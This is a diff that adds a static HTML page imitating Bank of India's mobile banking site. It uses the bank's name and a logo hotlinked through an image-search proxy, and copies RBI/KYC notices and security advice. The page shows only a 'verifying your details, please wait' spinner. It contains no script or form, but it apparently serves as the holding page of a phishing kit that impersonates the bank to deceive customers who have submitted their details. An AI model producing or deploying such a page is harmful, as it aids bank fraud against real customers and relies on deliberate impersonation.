@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BOI MOBILE</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+
+    .form-container {
+      background-color: white;
+      max-width: 90%;
+      width: 400px;
+      margin: 30px auto;
+      padding: 25px 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .logo {
+      display: block;
+      width: 100%;
+      max-width: 180px;
+      height: auto;
+      margin: 0 auto 15px;
+    }
+
+    .ticker {
+      margin-bottom: 15px;
+    }
+
+    marquee {
+      background: #007dc6;
+      color: yellow;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    h1 {
+      color: #003366;
+      margin-bottom: 5px;
+    }
+
+    h3 {
+      color: #333;
+      margin-bottom: 20px;
+      font-weight: normal;
+    }
+
+    /* Spinner styles */
+    .spinner-container {
+      margin: 40px auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #007dc6;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .verifying-text {
+      font-size: 18px;
+      color: #003366;
+    }
+
+    .important-note {
+      margin-top: 30px;
+      background-color: #fffbe6;
+      color: #333;
+      font-size: 14px;
+      border-left: 5px solid #ffcc00;
+      padding: 15px;
+      text-align: left;
+      line-height: 1.6;
+      border-radius: 6px;
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 20px;
+      }
+
+      h3 {
+        font-size: 15px;
+      }
+
+      .form-container {
+        padding: 20px 15px;
+      }
+
+      .logo {
+        max-width: 160px;
+      }
+
+      marquee {
+        font-size: 13px;
+      }
+
+      .important-note {
+        font-size: 13px;
+      }
+
+      .verifying-text {
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <img src="https://imgs.search.brave.com/kbZs-xrd1Bu6JaWNLxwmBUKr4drQWlYM22nHo4QNH3o/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly8xMDAw/bG9nb3MubmV0L3dw/LWNvbnRlbnQvdXBs/b2Fkcy8yMDIxLzA2/L0Jhbmstb2YtSW5k/aWEtbG9nby01MDB4/MjgxLnBuZw" alt="BOI Logo" class="logo">
+
+    <!-- Scrolling Ticker -->
+    <div class="ticker">
+      <marquee behavior="scroll" scrollamount="5" direction="left" onmouseover="this.stop();" onmouseout="this.start();">
+        Dear Customers, As per RBI guidelines CKYC identification number (14 digits) is mandatory. Please submit your CKYC ID number (if available with you) and if the same is not available, kindly contact your home/nearest branch along with latest KYC documents to generate CKYC ID. ****To Strengthen your Aadhaar, update your Aadhaar if 10 years old.**** As per the RBI’s directives, All the IB customers mandatorily register their mobile for electronic transactions. Internet banking facilities of the customers where mobile number is not registered has been discontinued. Please register your mobile number with the nearest branch to activate internet banking services.
+      </marquee>
+    </div>
+
+    
+    <h3>BOI MOBILE Banking Services</h3>
+
+    <!-- Verifying Section -->
+    <div class="spinner-container">
+      <div class="spinner"></div>
+      <div class="verifying-text">We are verifying your details,<br>Please wait...</div>
+    </div>
+
+    <!-- Important Note -->
+    <div class="important-note">
+      <strong>IMPORTANT:</strong> In our constant endeavor to give you better service and user experience, we have enhanced our Internet Banking site. You may feel changes in the User Interface (look and feel). Please change your password regularly and keep your computer protected and updated with latest Antivirus and patches. Please do not click on any hyperlinks to reach our site, but type our site address:  
+      <a href="http://www.bankofindia.co.in" target="_blank">http://www.bankofindia.co.in</a><br><br>
+      <em>[Best viewed in IE version 9 and above, Mozilla Firefox 34 and above, Google Chrome 40 and above, and Safari 7 and above with resolution 1024 x 768. 143-DC]</em>
+    </div>
+  </div>
+
+</body>
+</html>
